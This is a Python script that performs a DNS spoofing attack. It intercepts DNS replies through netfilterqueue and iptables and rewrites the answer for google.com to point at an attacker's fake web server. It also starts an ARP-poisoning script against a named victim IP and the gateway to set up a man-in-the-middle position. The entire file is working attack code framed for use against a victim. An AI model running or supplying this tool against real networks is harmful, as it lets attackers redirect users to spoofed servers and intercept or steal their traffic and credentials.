# DNS spoofing

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
from colorama import Fore, init
import argparse
import threading


# Define colors
GREEN = Fore.GREEN
RESET = Fore.RESET

# Init colorama module
init()

# DNS mapping
dns_hosts = {
    "google.com": None # "192.168.1.39"
    # Add what you want for the victim
}

def is_same_domain(d1,d2):
    # Remove "www"
    d1 = d1.replace("www.","")
    d2 = d2.replace("www.","")
    return d1 == d2

# Function to get the modified IP of domains in dns_hosts dictionnary
def get_modified_ip(qname,dns_host=dns_hosts):
    # return the ip address of our dictionnary or None
    for domain in dns_host:
        if is_same_domain(qname,domain):
            # return ip addr
            return dns_hosts[domain]

def process_packet(packet):
    # for packets redirect to our queue

    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload()) # type: ignore

    if scapy_packet.haslayer(DNSRR): # type: ignore
        # DNS Reply ( DNS RESSOURCE RECORD )
        # modify the packet
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        # set back as netfilter queue packet
        packet.setpayload(bytes(scapy_packet))
    # accept the packet
    packet.accept()
            
def modify_packet(packet):

    qname = packet[DNSQR].qname # type: ignore
    # decode the domain name
    qname = qname.decode().strip(".")
    # get the modified IP if exist
    modified_ip = get_modified_ip(qname)

    # if it's not in our dictionnary we don't modify
    if not modified_ip:
        print("no modification : ", qname)
        return packet
    
    # print original IP addr
    print(f"{GREEN}[+] Domain : {qname}{RESET}")
    print(f"{GREEN}[+] Original IP : {packet[DNSRR].rdata}{RESET}") # type: ignore
    print(f"{GREEN}[+] Domain : {modified_ip}{RESET}")

    # Craft new answer
    packet[DNS].an = DNSRR(rrname=packet[DNSQR].qname,rdata=modified_ip) # type: ignore
    packet[DNS].ancount = 1 # type: ignore

    # packet is modified so we need to erase some options
        #scapy will do new calculation automatically
    del packet[IP].len # type: ignore
    del packet[IP].chksum # type: ignore
    del packet[UDP].len # type: ignore
    del packet[UDP].chksum # type: ignore

    return packet

if __name__ == "__main__":
    QUEUE_NUM = 0
    # insert the iptable FORWARD rule
    os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")
    # Instantiate the netfilter queue
    queue = NetfilterQueue()

    try:
        parser = argparse.ArgumentParser(description="ARP spoof script")
        parser.add_argument("fakeserver", help="IP address for our fake web server")
        parser.add_argument("target", help="Victim IP address to ARP Poison")
        parser.add_argument("host", help="Host IP address  that you wish to intercept packets (gateway)")
        args = parser.parse_args() 
        fakeserver, target, host = args.fakeserver, args.target, args.host
        dns_hosts["google.com"] = fakeserver

        # Launch arp spoofing program
        thread_spoof = threading.Thread(target=lambda target, host: os.system(f"python3 arp_spoof.py {target} {host}"), args=(target, host))
        thread_spoof.start()

        #bind the queue number to our callback process_packet
        queue.bind(QUEUE_NUM,process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")